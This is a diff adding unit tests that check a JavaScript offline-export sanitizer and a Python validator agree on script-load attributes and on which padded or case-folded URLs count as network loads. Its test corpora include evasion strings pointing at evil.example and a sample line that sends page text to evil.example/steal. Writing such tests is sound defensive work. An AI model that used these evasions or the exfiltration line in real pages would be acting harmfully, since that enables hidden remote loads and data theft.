@@ -1247,6 +1247,101 @@ class RuntimeParityTests(unittest.TestCase):
                 "unstripped executable script the gate blesses, or a false rejection." % raw)
 
 
+    def test_the_python_and_js_script_load_attributes_agree(self):
+        """The offline strip (JS) and the strict validator (Python) must call the SAME attributes a
+        script LOAD.
+
+        They are two independent spellings of the set, and a drift between them is the CMH-OFFLINE-04
+        failure mode itself: the validator would bless an offline file the strip no longer protects
+        (which is exactly how an SVG `<script href>` shipped in a zero-network document), or reject
+        one the exporter just produced. The literal control below is written out rather than derived
+        from either side, so dropping an attribute from BOTH cannot quietly delete its own coverage.
+        """
+        source = self._read("68-export-offline.js")
+        m = re.search(r"const _OFFLINE_SCRIPT_LOAD_ATTRS = \[([^\]]*)\];", source)
+        self.assertIsNotNone(m, "the runtime no longer declares _OFFLINE_SCRIPT_LOAD_ATTRS; the "
+                                "parity check is stale and must be re-pointed at whatever replaced it")
+        runtime_attrs = tuple(re.findall(r'"([^"]+)"', m.group(1)))
+        self.assertEqual(runtime_attrs, ("src", "href", "xlink:href"),
+                         "the runtime's script-load attribute set changed. An SVG <script> loads "
+                         "through `href`/`xlink:href` and an HTML one through `src`; update this "
+                         "literal control and the validator's SCRIPT_LOAD_ATTRS together.")
+        self.assertEqual(runtime_attrs, tuple(resources.SCRIPT_LOAD_ATTRS),
+                         "the runtime's _OFFLINE_SCRIPT_LOAD_ATTRS and the validator's "
+                         "SCRIPT_LOAD_ATTRS have diverged: %r vs %r. An attribute only one of them "
+                         "reads is either an unstripped remote loader the gate blesses, or an "
+                         "exported file its own --strict run rejects."
+                         % (runtime_attrs, tuple(resources.SCRIPT_LOAD_ATTRS)))
+
+    # A browser removes leading C0 controls and spaces (U+0000-U+0020) before it parses a URL, so a
+    # value padded with those still loads while one padded with NBSP or U+FEFF does not resolve as a
+    # URL at all. Both engines must draw that line in the same place: JS `\s` excludes U+001C-U+001F
+    # but includes U+FEFF, Python's includes the former and not the latter, and Python's
+    # `re.IGNORECASE` folds `s` onto U+017F where JS never does.
+    _NETWORK_URL_CORPUS = [
+        "https://evil.example/x.js", "HTTPS://EVIL.EXAMPLE/x.js", "http://evil.example/x.js",
+        "//evil.example/x.js", " https://evil.example/x.js", "\thttps://evil.example/x.js",
+        "\n//evil.example/x.js", "\r\n//evil.example/x.js", "\f//evil.example/x.js",
+        "\u000b//evil.example/x.js", "\u0000//evil.example/x.js", "\u001c//evil.example/x.js",
+        "\u001d//evil.example/x.js", "\u001e//evil.example/x.js", "\u001f//evil.example/x.js",
+        "\u000e//evil.example/x.js", "\u001f  \t https://evil.example/x.js",
+        # padding a browser does NOT strip: the value is a relative reference, not a network load
+        "\u00a0https://evil.example/x.js", "\u2028//evil.example/x.js", "\u3000//evil.example/x.js",
+        "\ufeff//evil.example/x.js", "\u200b//evil.example/x.js",
+        # not a network load: relative, rooted, fragment, data, another scheme, or the literal
+        # buried after something that is not padding
+        "", "svg-local-keep.js", "./x.js", "/root-relative.js", "#anchor",
+        "data:text/javascript,void%200", "mailto:someone@example.com", "ftp://evil.example/x.js",
+        "x https://evil.example/x.js", "https:/evil.example/x.js", "https:evil.example/x.js",
+        # Case folding is ASCII-only on both sides: Python's `re.IGNORECASE` would otherwise fold
+        # `s` onto U+017F, which a JS `/i` regex never does (and which no browser resolves as a
+        # scheme either), so the gate would flag a value the strip keeps.
+        "http\u017f://evil.example/x.js", "HTTP\u017f://evil.example/x.js",
+        "\u212a//evil.example/x.js",
+    ]
+
+    def test_the_python_and_js_network_url_predicates_agree(self):
+        """Run the runtime's own network-URL regex in node and require identical verdicts.
+
+        Compiling the extracted JS text with Python's `re` could only ever prove what PYTHON does
+        with it, and the whole point of spelling the whitespace class out is an ENGINE difference.
+        Skipped when node is absent, the way the repo's other node-gated checks degrade.
+        """
+        node = shutil.which("node")
+        if not node:
+            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
+        source = self._read("68-export-offline.js")
+        m = re.search(r"const _OFFLINE_NETWORK_URL_RE = /([^\n]*)/i;\n", source)
+        self.assertIsNotNone(m, "the runtime no longer declares _OFFLINE_NETWORK_URL_RE; the "
+                                "parity check is stale and must be re-pointed at whatever replaced it")
+        # The extractor takes everything up to the LAST `/i;` on the line, so a pattern that ever
+        # contained that sequence would be captured truncated and this test would then compare the
+        # wrong regex - passing while the real one drifted.
+        self.assertNotIn("/i;", m.group(1),
+                         "the extracted pattern is truncated: the regex literal now contains '/i;'")
+        payload = {"pattern": m.group(1), "corpus": self._NETWORK_URL_CORPUS}
+        script = (
+            "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
+            "const p=JSON.parse(raw);const re=new RegExp(p.pattern,'i');"
+            "process.stdout.write(JSON.stringify(p.corpus.map(s=>re.test(String(s||'')))));});"
+        )
+        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
+                              capture_output=True, text=True, encoding="utf-8")
+        self.assertEqual(proc.returncode, 0,
+                         "node could not evaluate the network-URL pattern: %s" % proc.stderr)
+        verdicts = json.loads(proc.stdout)
+        self.assertEqual(len(verdicts), len(self._NETWORK_URL_CORPUS),
+                         "node returned %d verdicts for %d samples"
+                         % (len(verdicts), len(self._NETWORK_URL_CORPUS)))
+        for value, js_says in zip(self._NETWORK_URL_CORPUS, verdicts):
+            self.assertEqual(
+                js_says, bool(resources.NETWORK_URL_RE.match(value)),
+                "the runtime's _OFFLINE_NETWORK_URL_RE and the validator's NETWORK_URL_RE "
+                "disagree about %r. A value only one of them calls a network URL is either a "
+                "remote load the gate blesses, or an exported file its own --strict run rejects."
+                % value)
+
+
     _NAV_CORPUS_NAVIGATES = [
         'location.href = "https://evil.example/steal?d=" + document.body.innerText;',
         "\nlocation = 'https://evil.example';",
